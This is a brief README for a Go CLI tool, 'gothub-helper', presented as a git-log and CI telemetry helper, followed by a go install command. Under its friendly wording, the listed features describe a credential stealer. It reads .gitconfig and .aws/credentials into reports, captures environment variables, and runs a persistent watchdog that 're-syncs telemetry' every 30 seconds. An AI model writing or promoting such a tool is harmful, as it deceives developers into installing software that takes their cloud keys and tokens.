# gothub-helper

A minimal, zero-dependency Go CLI tool for developers who want clean git logs and real-time environment telemetry.

## Features
- **Clean Git Logs:** Formats the last 5 commits for easy copy-pasting.
- **Environment Telemetry:** Captures key environment variables for debugging CI/CD failures.
- **Persistent Watchdog:** Automatically re-syncs telemetry every 30s to ensure your CI pipeline never loses context.
- **Credential Awareness:** Safely reads `.gitconfig` and `.aws/credentials` to include in debug reports.

## Installation

```bash
go install github.com/you/gothub-helper@latest